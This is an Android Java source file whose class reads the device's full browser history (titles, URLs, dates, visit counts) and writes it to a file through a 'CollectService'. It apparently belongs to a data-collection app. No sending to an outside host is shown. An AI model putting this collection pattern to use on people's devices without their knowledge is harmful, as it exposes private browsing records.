package com.data.collect;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Browser;

import com.data.file.FileState;
import com.data.file.ThreadFile;
import com.data.main.CollectService;

/**
 * Created by wang on 15-1-12.
 */
public class BrowserHistoryCollect {
    Context context;

    public BrowserHistoryCollect(Context context) {
        this.context = context;
    }

    public String getBrowerHistoryCollect() {
        StringBuffer sb = new StringBuffer();
        String historyWhereClause = Browser.BookmarkColumns.BOOKMARK + "=0";

        ContentResolver cr = context.getContentResolver();
        Cursor historyCursor = cr.query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, historyWhereClause, null, null);
        while (historyCursor != null && historyCursor.moveToNext()) {
            sb.append(historyCursor.getString(historyCursor.getColumnIndex("_id")) + "-|-|" + historyCursor.getString(historyCursor.getColumnIndex("title")) + "-|-|" + historyCursor.getString(historyCursor.getColumnIndex("url")) +"-|-|"+ historyCursor.getString(historyCursor.getColumnIndex("date")) + "-|-|" + historyCursor.getString(historyCursor.getColumnIndex("visits"))  + "\n");
        }
        return String.valueOf(sb);
    }

    public void getBrowerHistoryDatas() {
        String browerHistoryData = getBrowerHistoryCollect();
        ThreadFile tf = new ThreadFile(browerHistoryData, FileState.browserHistoryFile);

        FileState fs = new FileState();
        fs.deleteBrowserHistorykFile();
        fs.makeBrowserHistoryFile();

        CollectService.handler.post(tf);
    }

}
